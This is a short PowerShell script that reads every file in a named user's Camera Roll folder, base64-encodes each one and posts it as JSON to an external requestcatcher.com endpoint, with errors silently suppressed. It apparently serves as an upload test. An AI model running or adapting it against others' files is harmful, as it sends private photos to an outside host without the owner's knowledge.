$sourceFolder = "C:\Users\michal.lukac\Pictures\Camera Roll"
$uploadUrl = "https://frno10.requestcatcher.com/test"

if (-not (Test-Path -Path $sourceFolder)) {
    Write-Host "Source folder not found: $sourceFolder"
    return
}

$filesToUpload = Get-ChildItem -Path $sourceFolder -File

foreach ($file in $filesToUpload) {
    Write-Host "Processing $($file.Name)..."

    $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)

    $base64String = [System.Convert]::ToBase64String($fileBytes)

    $payloadObject = [PSCustomObject]@{
        fileName    = $file.Name
        fileContent = $base64String
    }

    $jsonPayload = $payloadObject | ConvertTo-Json

    $headers = @{
        "Content-Type" = "application/json"
    }

    Invoke-WebRequest -Uri $uploadUrl -Method Post -Headers $headers -Body $jsonPayload -ErrorAction SilentlyContinue
}